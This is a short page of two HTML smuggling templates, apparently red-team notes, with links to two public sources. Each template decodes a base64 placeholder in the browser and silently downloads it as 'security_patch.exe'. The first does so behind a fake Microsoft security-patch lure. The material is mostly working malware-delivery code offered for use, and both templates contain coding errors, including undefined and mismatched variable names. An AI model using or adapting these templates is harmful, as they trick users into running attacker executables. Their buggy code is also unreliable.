# HTML Smuggling Templates

```html
<html>
    <body>
        <h1>
            Security Patch Update!
        </h1>
        <p>
            Please install this Microsoft security patch update!
        </p>
        <script>
            function Base64ToArray(base64) {
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for(var i = 0; i < len; i++)
                    bytes[i] = binary_string.charCodeAt(i);
                return bytes.buffer;
            }
            // $ basenc -w 0 --base64 payload.exe
            var file = '<base64_encoded_payload>'
            var data = Base64ToArray(base64_binary);
            var blob = new Blob([data], {type: 'octet/stream'});
            var filename = 'security_patch.exe';
            
            var anchor = document.createElement('a');
            document.body.appendChild(anchor);
            anchor.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            anchor.href = url;
            anchor.download = filename;
            anchor.click();
            window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
```

```html
<html>
    <body>
        <script>
            function base64ToArrayBuffer(base64) {
                var binary_string = window.atob(base64);
                var len = binary_string.length;

                var bytes = new Uint8Array(len);
                for(var i = 0; i < len; i++) {
                    bytes[i] = binary_string.charCodeAt(i);
                }
                return bytes.buffer;
            }

            var file = '<base64_encoded_exe_shell>';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var filename = 'security_patch.exe';

            if(window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob, fileName);
            } else {
                var anchor = document.createElement('a');
                document.body.appendChild(a);
                anchor.style = 'display: none';
                var url = windows.URL.createObjectURL(blob);
                anchor.href = url;
                anchor.download = fileName;
                anchor.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
    </body>
</html>
```

---
## References

- [raulm0429: HTMLSmuggling](https://github.com/raulm0429/HtmlSmuggling)

- [JamesCooteUK Github Gist](https://gist.github.com/JamesCooteUK/507e5cc924e7811fbada64102d35509a)